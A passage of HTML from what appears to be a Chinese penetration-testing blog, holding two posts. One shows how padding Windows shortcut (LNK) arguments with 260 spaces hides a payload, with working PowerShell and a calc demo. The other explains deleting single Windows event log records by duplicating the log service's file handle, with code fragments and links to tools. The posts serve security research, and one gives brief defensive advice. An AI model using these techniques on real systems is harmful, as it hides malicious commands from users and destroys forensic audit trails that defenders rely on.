      <td style="text-align: center">0191+2+0012×2=01b7h</td>
      <td style="text-align: center">2字节</td>
      <td style="text-align: center">长度（Unicode），实际长度要乘以2</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-7.png" alt="Alt text"></p>

<p>命令行参数长度为039f（Unicode）</p>

<p>下一段（自定义图标）的起始地址为01b7+2+039f×2=08f7h</p>

<h3 id="7自定义图标">7、自定义图标</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">01b7+2+039f×2=08f7h</td>
      <td style="text-align: center">2字节</td>
      <td style="text-align: center">长度（Unicode），实际长度要乘以2</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-8.png" alt="Alt text"></p>

<p>自定义图标长度为000bf（Unicode）</p>

<p>下一段（自定义图标）的起始地址为08f7+2+000b×2=090fh</p>

<h2 id="0x04-实现原理">0x04 实现原理</h2>
<hr>

<p>结合Delphi的POC代码和Lnk文件格式，对比正常lnk文件和poc文件差异，发现只有命令行参数长度不同</p>

<p>故推断出原理：</p>

<p><code class="language-plaintext highlighter-rouge">只要命令行参数长度超过260即可！</code></p>

<p>测试powershell代码:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$file = Get-Content "c:\test\test.txt"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("c:\test\test.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.Arguments = '                                                                                                                                                                                                                                      '+ $file
$Shortcut.Save()
</code></pre></div></div>

<p>test.txt中写入如下内容：</p>

<p><code class="language-plaintext highlighter-rouge">/c start calc.exe</code></p>

<p>执行命令后生成的test.lnk文件格式如图，260个空格字符后面接着为payload代码</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/4-1.png" alt="Alt text"></p>

<p>查看文件参数，显示如图，均被空格字符填充，payload成功隐藏</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/4-2.png" alt="Alt text"></p>

<p>运行test.lnk，弹出计算器，payload成功执行</p>

<p>完整过程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/5-1.gif" alt="Alt text"></p>

<p>gif在线地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/5-1.gif</p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<p>可将payload放置在260个空字符之后</p>

<p>这样无法在文件属性查看payload，只能通过文件格式去分析</p>

<p>payload加密后分析难度也会变大</p>

<h2 id="0x06-防御">0x06 防御</h2>
<hr>

<p>注意lnk文件大小</p>

<p>必要情况下，直接分析16进制lnk文件格式</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>对于lnk文件，虽然通过查看文件属性无法看到lnk文件的命令行参数，但不代表其不存在，在此提醒用户注意</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 31, 2016
  </div>

  
</article><article class="post">
  <h1>Windows XML Event Log (EVTX)单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows单条日志清除系列文章的第五篇，介绍第三种删除当前系统单条日志记录的方法：枚举当前系统的所有进程，获得指定日志文件的句柄，通过DuplicateHandle复制句柄，获得权限，利用该句柄实现日志文件的修改</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用思路</li>
  <li>程序实现</li>
  <li>枚举所有进程，获得指定文件句柄</li>
  <li>通过DuplicateHandle复制句柄</li>
  <li>开源实现代码</li>
</ul>

<h2 id="0x02-利用分析">0x02 利用分析</h2>
<hr>

<p>上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E5%9B%9B-%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录》</a>提到，某些条件下，高版本的Windows系统不允许注入保护进程svchost.exe，而我们又不想停掉日志服务，那么该怎么办呢？</p>

<p>我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E4%B8%8E%E5%88%A0%E9%99%A4/">《渗透技巧——Windows系统的文件恢复与删除》</a>曾涉及到解决方法，可以尝试通过DuplicateHandle复制句柄，将“伪句柄”转换成实句柄，获得日志文件的操作权限</p>

<h2 id="0x03-枚举所有进程获得指定文件句柄">0x03 枚举所有进程，获得指定文件句柄</h2>
<hr>

<p>思路如下：</p>

<ul>
  <li>使用内核API NtQuerySystemInformation查询SystemHandleInformation，获得所有进程的句柄</li>
  <li>筛选出类型为文件的句柄</li>
  <li>如果无法打开句柄对应的进程，留下标志位，不再重复打开该进程</li>
  <li>过滤出有可能导致挂起的句柄，利用API WaitForSingleObject进行判断</li>
  <li>通过NtDuplicateObject获取句柄的名称和具体的数值信息，筛选出指定句柄</li>
</ul>

<p>代码参考地址：</p>

<p><a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnumerateProcess%26GetFile'sHandle%26CloseHandle(Win7).cpp">https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnumerateProcess%26GetFile’sHandle%26CloseHandle(Win7).cpp</a></p>

<p>代码适用于Win7和更高版本的操作系统，并提供了是否选择关闭句柄的功能</p>

<p>当然，也可以先枚举服务信息，找到日志服务对应的进程，缩小查询范围，再获得日志文件的句柄，思路如下：</p>

<ul>
  <li>枚举服务信息，找到日志服务对应的进程</li>
  <li>使用内核API NtQuerySystemInformation查询SystemHandleInformation，获得所有进程的句柄</li>
  <li>筛选出日志服务对应进程中的句柄</li>
  <li>通过NtDuplicateObject获取句柄的名称和具体的数值信息，筛选出指定句柄</li>
</ul>

<p>在效率上会更高，不会遇到有可能导致挂起的句柄</p>

<p>代码参考地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetPIDandHandle(evtx).cpp</p>

<p>代码实现了自动获得日志服务的进程，缩小查询范围，获得日志文件的句柄</p>

<h2 id="0x04-通过duplicatehandle复制句柄">0x04 通过DuplicateHandle复制句柄</h2>
<hr>

<p>通过枚举进程获得了日志文件的句柄后，发现这是一个“伪句柄”，原因如下：</p>

<p>获取句柄的具体内容需要调用NtDuplicateObject</p>

<p>DuplicateObject的函数原型：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI DuplicateHandle(
  _In_  HANDLE   hSourceProcessHandle,
  _In_  HANDLE   hSourceHandle,
  _In_  HANDLE   hTargetProcessHandle,
  _Out_ LPHANDLE lpTargetHandle,
  _In_  DWORD    dwDesiredAccess,
  _In_  BOOL     bInheritHandle,
  _In_  DWORD    dwOptions
);
</code></pre></div></div>

<p>官方说明文档：</p>

<p>https://msdn.microsoft.com/en-us/library/ms724251(VS.85).aspx</p>

<p>第7个参数dwOptions，可以为两个值：</p>

<ul>
  <li>DUPLICATE_CLOSE_SOURCE,0x00000001,Closes the source handle. This occurs regardless of any error status returned.</li>
  <li>DUPLICATE_SAME_ACCESS,0x00000002,Ignores the dwDesiredAccess parameter. The duplicate handle has the same access as the source handle.</li>
</ul>

<p>另一参考文档：</p>

<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-zwduplicateobject</p>

<p>获得参考信息：</p>

<blockquote>
  <p>DUPLICATE_SAME_ATTRIBUTES	Instead of using the HandleAttributes parameter, copy the attributes from the source handle to the target handle.</p>
</blockquote>

<p>参考资料中并未提到DUPLICATE_SAME_ATTRIBUTES的值，这里猜测为0</p>

<p><strong>注：</strong></p>

<p>如果读者有更好的答案和解释，希望能够告诉我</p>

<p>为了保证我们在调用NtDuplicateObject遍历句柄时不会影响到系统的其他句柄，这里先将dwOptions设置为<code class="language-plaintext highlighter-rouge">DUPLICATE_SAME_ATTRIBUTES</code>(即0)，只获得句柄的属性</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &amp;dupHandle, 0, 0, 0)
</code></pre></div></div>

<p>找到指定的日志文件句柄后，下一步将要对日志文件进行操作，这里需要将dwOptions设置为<code class="language-plaintext highlighter-rouge">DUPLICATE_SAME_ACCESS</code>，代表完全复制</p>

<p>用法如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &amp;dupHandle, 0, 0, DUPLICATE_SAME_ACCESS)
</code></pre></div></div>

<p>dupHandle和源句柄具有相同的权限，对日志文件进行操作时，向CreateFileMapping传入dupHandle即可</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateFileMapping(dupHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
</code></pre></div></div>

<p>余下日志删除操作的部分可参考之前的系列文章</p>

<p>完整代码已开源，包括两种删除日志的方法：</p>

<h3 id="1自己解析格式实现日志删除">1、自己解析格式，实现日志删除</h3>

<p>地址如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordbyGetHandle.cpp</p>

<p>代码实现了获得指定日志文件的句柄，通过该句柄获得日志文件的操作权限，能够删除指定evtx文件的单条日志</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/4-1.png" alt="Alt text"></p>

<h3 id="2使用winapi-evtexportlog过滤出想要删除的内容">2、使用WinAPI EvtExportLog，过滤出想要删除的内容</h3>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordbyGetHandleEx.cpp</p>

<p>代码实现了读取指定路径下的日志文件内容，用来覆盖系统日志</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/4-2.png" alt="Alt text"></p>

<p>通常做法是先将日志线程挂起，使得系统无法继续收集日志，代码地址如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/SuspendorResumeTid.cpp</p>

<p>接着读取系统日志内容，删除指定日志，将新日志保存，代码如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecord-EvtExportLog.cpp</p>

<p>最后使用DeleteRecordbyGetHandleEx读取新日志，覆盖系统日志，实现日志删除</p>

<p><strong>注:</strong></p>

<p>对于以上两种方法，删除<code class="language-plaintext highlighter-rouge">setup.evtx</code>是没有问题的，删除<code class="language-plaintext highlighter-rouge">system.evtx</code>和<code class="language-plaintext highlighter-rouge">security.evtx</code>会存在因为竞争条件导致删除失败的情况</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了第三种删除当前系统单条日志记录的方法：枚举当前系统的所有进程，获得指定日志文件的句柄，通过DuplicateHandle复制句柄，获得权限，利用该句柄实现日志文件的修改</p>

<p>优点是不需要注入进程svchost.exe，也就不需要考虑保护进程的注入绕过，并且不需要考虑进程间的信息传递，效率更高</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 25, 2018
  </div>

  
</article>